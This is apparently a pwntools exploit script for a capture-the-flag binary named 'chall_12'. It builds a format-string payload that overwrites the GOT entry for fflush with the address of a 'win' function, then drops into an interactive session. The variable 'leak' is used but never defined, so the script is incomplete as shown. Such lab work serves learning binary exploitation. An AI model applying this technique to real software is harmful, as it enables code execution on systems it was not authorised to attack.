from pwn import *

binary = context.binary = ELF('./chall_12')

p = process('./chall_12')

main = int(leak,16)
binary.address = main - binary.sym.main

offset = 6
payload = fmtstr_payload(offset,{binary.got.fflush:binary.sym.win})
p.sendline(payload)

null = payload.find(b'\x00')
p.recvuntil(payload[null-3:null])

p.interactive()
